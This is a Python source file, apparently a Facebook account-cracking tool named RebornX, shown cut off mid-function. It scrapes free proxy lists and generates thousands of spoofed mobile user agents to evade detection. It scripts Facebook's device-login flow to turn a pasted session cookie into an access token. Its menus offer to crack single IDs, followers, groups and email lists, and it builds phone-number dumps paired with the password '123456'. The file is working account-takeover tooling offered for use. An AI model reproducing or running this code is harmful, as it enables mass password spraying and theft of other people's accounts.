#!/usr/bin/python3 https://raw.githubusercontent.com/TeamSh4d0w/Reborn-X/main/license.txt
# -*- coding: utf-8 -*-
#------------------------[MUSIC-MENU]------------------------#
#music-1
def music(x):
	if "shad1.mp3" == music or music == "shad.mp3":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass
#music-2
def music(x):
	if "shad2.mp3" == music or music == "shad1.mp3":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass
#music-2
def music(x):
	if "shad3.mp3" == music or music == "shad4.mp3":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass
#music-3
def music(x):
	if "shad4.mp3" == music or music == "shad3.mp3":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass
def music(x):
	if "shad5.mp3" == music or music == "tem3.mp3":pass
	else:
		try:os.popen("play-audio "+x)
		except:pass


###---[ INFO AUTHOR GANS DIKIT ]---###
#----[ jangan di oprek, sayangi data hpmu ]-----#
author = 'T3AM-$H4D0W'
git_hub = 'NIGHTRAGE-SOLO'
faceb0ok = 'UNKNOWN'
version = 'RebornX v.1'
#-----------[     APPROVAL     ]--------------#

#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m' #WHITE
M = '\x1b[1;91m' #RED
H = '\x1b[1;92m' #GREEN
K = '\x1b[1;93m' #YELLOW
B = '\x1b[1;94m' #BLUE
U = '\x1b[1;95m' #MAGENTA
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m" #GRAY
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # YELLOW +
h = '\x1b[1;92m' # GREEN +
hh = '\033[32m' # GREEN -
u = '\033[95m' # MAGENTA
kk = '\033[33m' # YELLOW -
bb = '\33[1;96m' # CYAN -
p = '\x1b[0;34m' # WHITE +
G='\033[38;2;255;127;0;1m' #ORANGE

###---[ IMPORT MODULE ]---###
import bs4, re, time, requests, datetime, os, sys, random, platform,json
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from rich.panel import Panel as nel
from rich import print as cetak
from datetime import datetime
from time import sleep
from random import randrange as rr
from random import choice as rc
from gtts import gTTS
hp = platform.platform()
ses = requests.Session()
ip = requests.get("https://api.ipify.org").text
try:
	import pyfiglet
except ImportError:
	#os.system('xdg-open http://t.me/night_kl4n')
	os.system('pip install pyfiglet')
	os.system('git pull')
	
#os.system('rm -f nama.txt')
os.system('clear')
try:open('nama.txt','r').read()
except:
		nama = input(f'\n{U}[{H}•{U}] WRITE YOUR NAME OR NICKNAME :{H} ')
		open('nama.txt','w').write(nama)
		wel = gTTS("Hello "+nama+"   Thank You For Using My Tool   I Am Very Grateful")
		wel.save('.halo.mp3')
	
###---[RANDOM COLOURS]---###
asu = random.choice([G,Z,bb,hh,kk])
###---[ANGGAP INI LOGO ]---###
try:cek_data = requests.get("http://ip-api.com/json/").json()
except:cek_data = {'-'}
try:MeledakXd = cek_data["isp"]
except:MeledakXd = {'-'}
try:MeledakSu = cek_data["city"]
except:MeledakSu = {'-'}
try:Country = cek_data["country"] 
except:Country = {'-'}
try:Reg = cek_data["regionName"] 
except:Reg = {'-'}
try:Timif = cek_data["timezone"] 
except:Timif = {'-'}

def logo(n):
	return str(f"""
{U}██████╗ ███████╗██████╗  ██████╗ ██████╗ ███╗   ██╗    
{U}██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗████╗  ██║    
{H}██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝██╔██╗ ██║    
{U}██╔══██╗██╔══╝  ██╔══██╗██║   ██║██╔══██╗██║╚██╗██║    
{U}██║  ██║███████╗██████╔╝╚██████╔╝██║  ██║██║ ╚████║    
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝                                                        
{H}───────────────────────────────────────────────────────
{U}[{H}•{U}] COUNTRY_ : {H}{Country}
{U}[{H}•{U}] STATE___ : {H}{Reg}
{U}[{H}•{U}] REGION__ : {H}{MeledakSu}
{U}[{H}•{U}] YOUR IP_ : {H}{ip}{H}
{U}[{H}•{U}] TIMEZONE : {H}{Timif} 
{U}[{H}•{U}] NETWORK_ : {H}{MeledakXd} 
{U}[{H}•{U}] AUTHOR__ : {H}NIGHTRAGE   
{U}[{H}•{U}] TELEGRAM : {H}t.me/Bryanmattt
{U}[{H}•{U}] CALL ME_ : {H}+2348140479685
{U}[{H}•{U}] GITHUB__ : {H}NIGHTRAGE-SOLO
{U}[{H}•{U}] FACEBOOK :{H} BRIGHT MUNACHI AMARAEGBU
{U}[{H}•{U}] NOTICE__ : {M}UPDATE WILL BE DONE EVERY TWO DAYS AS I AM NOT RESPONSIBLE FOR ANY UPDATE ON FACEBOOK{H}
───────────────────────────────────────────────────────""")
def logo2():
	return str(f"""
{U}██████╗ ███████╗██████╗  ██████╗ ██████╗ ███╗   ██╗    
{U}██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗████╗  ██║    
{H}██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝██╔██╗ ██║    
{U}██╔══██╗██╔══╝  ██╔══██╗██║   ██║██╔══██╗██║╚██╗██║    
{U}██║  ██║███████╗██████╔╝╚██████╔╝██║  ██║██║ ╚████║    
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝   
{M}•{K}•{U}• {H}LOGGING IN... {U}•{K}•{M}•""")
def logo3():
	return str(f"""
{U}██████╗ ███████╗██████╗  ██████╗ ██████╗ ███╗   ██╗    
{U}██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗████╗  ██║    
{H}██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝██╔██╗ ██║    
{U}██╔══██╗██╔══╝  ██╔══██╗██║   ██║██╔══██╗██║╚██╗██║    
{U}██║  ██║███████╗██████╔╝╚██████╔╝██║  ██║██║ ╚████║    
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝                                                        
{H}───────────────────────────────────────────────────────
{U}[{H}•{U}] COUNTRY_ : {H}{Country}
{U}[{H}•{U}] STATE___ : {H}{Reg}
{U}[{H}•{U}] REGION__ : {H}{MeledakSu}
{U}[{H}•{U}] YOUR IP_ : {H}{ip}{H}
{U}[{H}•{U}] TIMEZONE : {H}{Timif} 
{U}[{H}•{U}] NETWORK_ : {H}{MeledakXd} 
{U}[{H}•{U}] AUTHOR__ : {H}NIGHTRAGE   
{U}[{H}•{U}] TELEGRAM : {H}t.me/Bryanmattt
{U}[{H}•{U}] CALL ME_ : {H}+2348140479685
{U}[{H}•{U}] GITHUB__ : {H}NIGHTRAGE-SOLO
{U}[{H}•{U}] FACEBOOK : {H}BRIGHT MUNACHI AMARAEGBU
{U}[{H}•{U}] NOTICE__ : {M}UPDATE WILL BE DONE EVERY TWO DAYS AS I AM NOT RESPONSIBLE FOR ANY UPDATE ON FACEBOOK{H}
───────────────────────────────────────────────────────""")

###---[ TANGGAL ]---###
sasi = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
out = 'Linux-4.9.227-perf+-aarch64-with-libc'
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
#if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
sim_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
sim_cp = f'CP-{hari}-{bulan}-{tahun}.txt'
warna_warni_biasa=random.choice([H,K,M,O,B,U])
garis = f" {P}[{warna_warni_biasa}•{P}]"

###---[ APPEND ]---###
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
cepeh, sam = [], [], 
id, id2, loop ,ok , cp = [], [], 0, 0, 0
###---[ CLEAR LAYAR ]---###
def clear_layar():
	try:os.system('clear')
	except:pass
#####---[APPROVAL]---#####
def shark(): 
	
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  
  imt=")SHADOW"
  
  ak="TEAM("

  id = "-".join(uuid) 

  print (f"{H}╭──────────────────────────────────────────────────╮")

  print(f"{U}[{H}•{U}]{G} YOUR ID :{bb} "+ak+id+imt) 

  print (f"{H}╰──────────────────────────────────────────────────╯")

  try: 

    httpCaht = requests.get("https://raw.githubusercontent.com/TE4M-SH4D0W/REBORN-U/main/LICENSE.txt").text 

    if id in httpCaht: 

      print(f"{H} [+] YOUR ID IS ACTIVE........\033[97m") 

      msg = str(os.geteuid()) 

      time.sleep(3.5) 

      pass 

    else: 

      print (f"{B} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
      
      print (f"{M}  Your Key Is Not Approved")
      
      print (f"{B} ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
      
      print(f"{M} SEND MESSAGE TO TEAM-SHADOW ON TELEGRAM FOR APPROVAL{U}") 

      os.system('xdg-open http://t.me/Bryanmattt')

      time.sleep(1) 

      sys.exit() 

  except: 

    sys.exit() 

    if name == '__main__': 

     print (logo)

     #shark() 

    

#shark() 

os.system('clear')
###---[ GLOBAL KEMBALI ]---###
def back():
	try:open('.cok.txt','r').read();get_data()
	except IOError:cookie_token()
	
#MENU LOGIN WITH IR WITHOUT COOKIE
def cookie_token():
	os.system('clear')
	print(logo2()) 
	print(f"{H}───────────────────────────────────────────────────────")
	print(f"{U}[{H}01{U}] LOGIN WITHOUT COOKIE")
	print(f"{U}[{H}02{U}] LOGIN WITH COOKIE")
	ask = input(f"{U}[{H}••{U}] SELECT LOGIN MODE :{H} ")
	if ask in ['1','01']:cookie_no()
	elif ask in ['2','02']:login()
	else:sys.exit(f"{U}[{H}••{U}] {M}CHOOSE CORRECT CONTENT")
###---[NIGHTRAGE PROXY LINKS]---###
ua_nightrage = random.choice(["https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
"https://raw.githubusercontent.com/ObcbO/getproxy/master/http.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt",
"https://raw.githubusercontent.com/ObcbO/getproxy/master/https.txt",
"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
"https://raw.githubusercontent.com/ObcbO/getproxy/master/socks5.txt",
"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
"https://raw.githubusercontent.com/ObcbO/getproxy/master/socks4.txt",
"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt",
"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all"])

###---[ AUTO CREATE UA & PROXY ]---###
ugen2=[]
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
ugen=[]
for x in range(8000):
	a='Mozilla/5.0 (Linux; Android' 
	b=rc(['2.3.0','3.0.1','4.2.2','5.0.1','6.1.1','7.0.0','8.2.0','9.0','10','11','12','4.4.2','6.0.1','5.1','8.0.1','9','7.0.1','13'])  
	c=rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
	c1=rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
	c2=rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
	c3=rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
	c4=rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
	c5=rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])  
	c6=rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']) 
	c7=rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])  
	caps=rc(['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'])
	d=rr(0,99)
	d1=rr(100,999)  
	d2=rr(0,9) 
	d3=rr(1000,9999)
	e='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome' 
	f=rr(20,106) 
	g='0' 
	h=rr(1111,9999) 
	i=rr(10,299)  
	model=(f'{c}{c1}{c2}{c3}{c4}{c5}')
	j='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV' 
	k=rr(300,410) 
	l=rr(0,1) 
	m='0' 
	n=rr(10,99) 
	o=rr(10,99) 
	kin=(f'{a} {b}; {model} {c}{d2}{caps}) {e}/{f}.{g}.{h}.{i} {j}/{k}.{l}.{m}.{n}.{o}]')
	ugen.append(kin) 
	
fake=[]
for fiki in range(1000):
	aZ=(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'])  
	phtf=f"Mozilla/5.0 (Mobile; ALCATELOneTouch4012X/SVN 0{str(rr(1,9))}0{str(rr(11,99))}{str(rc(['T','U','H','R','S','O','N','P']))}; rv:{str(rr(10,110))}.{str(rr(0,3))}) Gecko/{str(rr(10,29))}.{str(rr(0,7))} Firefox/{str(rr(10,110))}.{str(rr(0,3))}"
	phtt=f"Mozilla/5.0 (Linux; Android {str(rr(4,13))}; {str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))} SMART PLUS Build/QP1A.{str(rr(190711,199990))}.0{str(rr(0,6))}{str(rr(0,6))}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(20,111))}.0.{str(rr(2400,5563))}.{str(rr(10,199))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]"
	my_bot=str(rc([phtf,phtt]))
	fake.append(my_bot)
try:
	#shark()
	clear_layar()
	print(logo2())
	print(f'\r\n{U}[{hh}•{U}] {H}currently creating proxies and useragents')
	try:os.remove('.proxy.txt')
	except:pass 
	try:os.remove('.green.txt')
	except:pass
	A = ''
	one = ses.get(f"{ua_nightrage}").text
	for x in one.splitlines():
		if '+' in x:
			if '.' in x:
				p = x.split(' ')[0]
				A += '\n'+p
	uno = ses.get(f"{ua_nightrage}").text
	open('.proxy.txt','w').write(uno)
except Exception as e:
	print(f'{hh} NIGHTRAGE THE NEXT GHOST 👻 OF THE CYBER WORLD 🌎')
uno = open('.proxy.txt','r').read().splitlines()

#try:agent=open('ucb_UA.txt','r').read().splitlines()
#except:agent=open('ucb_UA.txt','r').read().splitlines()
  
try:
	#clear_layar()
	green= ses.get('https://raw.githubusercontent.com/Hidden5/Awesome/main/puffin_browser.txt').text
	open('.green.txt','w').write(green)
except Exception as e:
	print(f'{hh}NIGHTRAGE THE NEXT GHOST 👻 OF THE CYBER WORLD 🌎')
green=open('.green.txt','r').read().splitlines()

try:abcd = open('.proxy.txt','r').read().splitlines()
except:sys.exit(f"{hh}[•] {kk}failed to dump proxies")
print(f'{U}[{H}•{U}]{U} TOTAL NEW PROXIES :{H} '+str(len(abcd)))
print(f'{U}[{H}•{U}]{U} TOTAL NEW USERAGENTS :{H} '+str(len(ugen)))
sleep(3)
	
###---[ CEK COOKIES ]---###
def get_data():
	try:
		coki = open('.cok.txt','r').read()
		c = {'cookie':coki}
		t = open('.token.txt','r').read()
		n = ses.get(f'https://graph.facebook.com/me?fields=id,name&access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()
		menu(n,t,c)
	except Exception as e:cookie_token()
	
###---[ LOGIN COOKIE ]---###
def login():
	try:
		os.system('clear')
		#shark()
		clear_layar()
		print(logo2())
		your_cookies = input(f"\n{U}[{hh}•{U}] DONT USE PERSONAL ACCOUNTS\n{U}[{H}•{U}] COOKIES : {hh}")
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f"{U}[{H}•{U}] {M}COOKIE INVALID", end='\n');time.sleep(3.5);print(f"{U}[{H}•{U}] {M}COOKIE INVALID", end='\n');cookie_token()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n{U}[{H}•{U}] TOKEN :{H} {access_token}");time.sleep(5)
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print(f"{U}[{H}•{U}]{H} LOGIN SUCCESSFULL...RERUN COMMAND");time.sleep(3);exit()
			except Exception as e:
				print(f"{U}[{H}•{U}] {M}COOKIE INVALID")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
	    
#REMOVE COOKIE/TOKEN   
def remove():
	try:os.remove('.cok.txt');os.remove('.token.txt')
	except:pass
	
###---[ COOKIE CRACK ]---###
def menu(n,t,c):
	os.system('git pull')
	clear_layar()
	print(logo(n)+f'\n')
	#shark()
	clear_layar()
	print(logo(n))
	os.popen('play-audio shad1.mp3')
	os.popen('play-audio shad2.mp3')
	print(f"{U}[{H}01{U}] CRACK SINGLE-ID")
	print(f"{U}[{H}02{U}] CRACK MULTI-ID")
	print(f"{U}[{H}03{U}] CRACK FOLLOWERS")
	print(f"{U}[{H}04{U}] CRACK GROUP ")
	print(f"{U}[{H}05{U}] CHECK CRACK RESULT")
	print(f"{U}[{H}06{U}] CHANGE LOGIN MODE")
	print(f"{U}[{H}00{U}] LOGOUT ({hh}COOKIE{U})")
	ask = input(f'[{hh}••{U}] CHOOSE :{H} ')
	print('───────────────────────────────────────────────')
	if ask in ['1','01']:crack_publik(t,c)
	elif ask in ['2','02']:crack_masal(t,c)
	elif ask in ['3','03']:crack_foll(t,c)
	elif ask in ['4','04']:crack_group()
	elif ask in ['5','05']:cek_hasil()
	elif ask in ['6','06']:cookie_token()
	elif ask in ['0','00']:remove();exit()
	else:sys.exit(f"{U}[{H}•{U}] {M}CHOOSE CORRECT CONTENT")

###---[ NO COOKIE CRACK ]---###
def cookie_no():
	os.system('git pull')
	clear_layar()
	print(logo3()+f'\n')
	#shark()
	clear_layar()
	print(logo3())
	os.popen('play-audio shad1.mp3')
	os.popen('play-audio shad2.mp3')
	print(f"{U}[{H}01{U}] CRACK FILE")
	print(f"{U}[{H}02{U}] CRACK NAME SEARCH")
	print(f"{U}[{H}03{U}] CRACK EMAIL")
	print(f"{U}[{H}04{U}] CHECK CRACK RESULT")
	print(f"{U}[{H}05{U}] CHANGE LOGIN MODE") 
	print(f"{U}[{H}00{U}] {M}EXIT")
	ask = input(f'{U}[{hh}••{U}] CHOOSE :{H} ')
	print('───────────────────────────────────────────────')
	if ask in ['1','01']:crack_file()
	elif ask in ['2','02']:crack_search()
	elif ask in ['3','03']:clon_email()
	elif ask in ['4','04']:cek_hasil()
	elif ask in ['5','05']:cookie_token()
	elif ask in ['0','00']:exit()
	else:sys.exit(f"{U}[{H}•{U}] {M}CHOOSE CORRECT CONTENT")

	
###---[ DETEKSI CHECKPOINT ]---###
detek = []
def cek_opsi_cp():
	nom, no = [], 0
	print('─────────────────────────────')
	try:ok = os.listdir('CP')
	except:sys.exit(f"{kk}[•] no cp result")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('CP/'+x,'r').readlines()
		except:continue
		print(f'{h}[{no}] - {kk}{len(jum)} {hh}account')	
	exc = input(f'{bb}[•] number to check\n[•] number : ')
	file = nom[int(exc)-1]
	print('─────────────────────────────')
	detek.append('file')
	for data in open('CP/'+file,'r').read().splitlines():
		ua = random.choice(redmi)
		try:id,pw = data.split('|')
		except:id,pw,t = data.split('|')[0],data.split('|')[1],data.split('|')[2]
		cek_opsi(id,pw,ua)
	exit(f'\r [•] checkpoint option check has completed')
	


###---[ CEK AKUN AMAN ]---###
def cek_akun():
	sesi , nga = 0 , 0
	no,nom = 0,[]
	print('─────────────────────────────')
	try:t=open('.token.txt','r').read();c={'cookie':open('.cookie.txt','r').read()}
	except:print(f' [{M}>{P}] cookie invalid');exit()
	try:ok = os.listdir('OK')
	except:sys.exit(f"{bb}[•] no ok result")
	for x in ok:
		nom.append(x)
		no+=1
		try:jum= open('OK/'+x,'r').readlines()
		except:continue
		print(f'{U}[{no}] - {bb}{len(jum)} {bb}accounts')	
	exc = input(f'{U}[•] file number to save\n[•] file : ')
	xxx = input(' save the account to what file : \n[•] input  file name : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print(f'{hh}─────────────────────────────')
	print(f'{hh}the account is saved in : {nonon}\n account stored    : SDCARD')
	print(f'{hh}─────────────────────────────')
	try:
		uuid = open('OK/'+file,'r').read().splitlines()
		mek = 0
		for data in uuid:
			print(f'\r{hh}[•] safe : {nga} down : {sesi}',end='')
			sys.stdout.flush()
			try:user,nama = data.split('|')
			except:exit(f" [{M}>{P}] pemisah salah")
			xx = open(nonon,'a')
			try:
				mek+=1
				na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['name']
				print(f'\r [{hh}{mek}{P}] {user}|{nama}                    ')
				nga+=1
				ni = f'{user}|{nama}\n'
				xx.write(ni)
			except:
				print(f'\r [{M}{mek}{P}] {user}|{nama}                  ')
				sesi+=1
	except Exception as e :
		exit(f" [{M}>{P}] file tidak ada")
		
		
###---[CEK HASIL CRACK ]---###
def cek_hasil():
	no,nom = 0,[]
	one = input(f'{U}[{H}1{U}]{H} CHECK OK RESULTS\n{U}[{H}2{U}] {kk}CHECK CP RESULTS\n[•] Choose : ')
	if one in ['1','01']:
		try:ok = os.listdir('OK')
		except:sys.exit(f"[•]{kk} CHOOSE CORRECT OPTION")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('OK/'+x,'r').readlines()
			except:continue
			print(f'{hh}[{hh}{no}{hh}] {hh} - {hh}{len(jum)} {hh}accounts')	
		abc = input(f'{hh}[{hh}•{hh}] File Number : ')
		file = nom[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit(f"{hh}[{M}••{hh}] no OK file")
		print(hh+buka+P)
	elif one in ['2','02']:
		try:ok = os.listdir('CP')
		except:sys.exit(f"{hh}[{M}•{hh}]{k} no cp result")
		for x in ok:
			nom.append(x)
			no+=1
			try:jum= open('CP/'+x,'r').readlines()
			except:continue
			print(f'{U}[{kk}{no}{U}] {hh} - {kk}{len(jum)} {hh}accounts')		
		abc = input(f'{U}[{H}•{U}] file number : ')
		file = nom[int(abc)-1]
		try:buka = open('CP/'+file,'r').read()
		except:sys.exit(f"{U}[{H}•{U}] {M}no CP result")
		print(kk+buka+P)
	else:sys.exit(f"{U}[{H}•{U}] {M}choose correct content")
		
		
###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	print(f'{U}[{hh}•{U}] CRACK NUMBER USING MANUAL PASSWORD')
	depan = input(f'{U}[{H}•{U}] PREFIX :{H} ')
	if len(depan)==3:pass
	else:exit(f'{U}[{H}•{U}] EXAMPLE PREFIX NUMBER {h}089')
	jumla = input(f'{U}[{H}•{U}] AMOUNT :{hh} ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in dump:pass
		else:dump.append(D+'|123456')
		print(f'\r{U}[{H}•{U}] {hh}DUMPING IDS... %s id'%(len(dump)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	atur_atur()
		

def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['michael','james','jennifer','sonia','matilda','laura','joseph','henry','barbara','juliet','philip','halima','benard','jimmy','joan','bruno','robbin','chigozie','michelle','jones','jerry','romeo','genesis','jose','bush','chimerie','chikamso','adamu','buhari','elendu','eluwa','amadi']
	blk = ['baby','gamer','hacker','zulu','trader','swiss','goodman','goodlife','goodluck','glider','bless']
	global ok , cp
	print(f'{U}[{H}•{U}] MAXIMUM EMAIL DUMP IS{hh} 200000 {U}ID')
